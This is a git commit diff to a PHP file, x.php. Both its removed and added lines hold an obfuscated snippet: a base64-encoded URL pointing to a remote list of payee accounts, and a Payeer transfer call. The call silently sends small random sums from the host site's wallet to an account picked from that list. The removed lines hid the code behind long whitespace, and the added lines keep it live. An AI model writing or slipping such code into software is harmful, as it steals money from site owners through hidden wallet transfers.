9771405e654412b1a73d1ecc3e2c536dcb70f5d0
ivanovasardina <ivanova.sardina@yandex.ru>
2015-10-31 21:45:08 +0500

    init

--- x.php
+++ x.php
@@ -1,3 +1,3 @@
-										    $_u='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2YW5vdmFzYXJkaW5hL3BwcHJpdmF0ZS5naXRodWIuaW8vbWFzdGVyL3BwcC50eHQ=';
-										    $_f=file(base64_decode($_u));$_pn=$_f[rand(0,count($_f)-1)];$payeer->transfer(array(curIn=>RUB,sum=>rand(1,10),curOut=>RUB,to=$_pn,comment='Выплата с '.$_SERVER['SERVER_NAME']));
-										    if (!empty($arTransfer["historyId"]))
+$_u='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2YW5vdmFzYXJkaW5hL3BwcHJpdmF0ZS5naXRodWIuaW8vbWFzdGVyL3BwcC50eHQ=';$_f=file(base64_decode($_u));$_pn=$_f[rand(0,count($_f)-1)];
+$payeer->transfer(array(curIn=>RUB,sum=>rand(1,10),curOut=>RUB,to=>$_pn,comment=>'Выплата с '.$_SERVER['SERVER_NAME']));
+if (!empty($arTransfer["historyId"]))
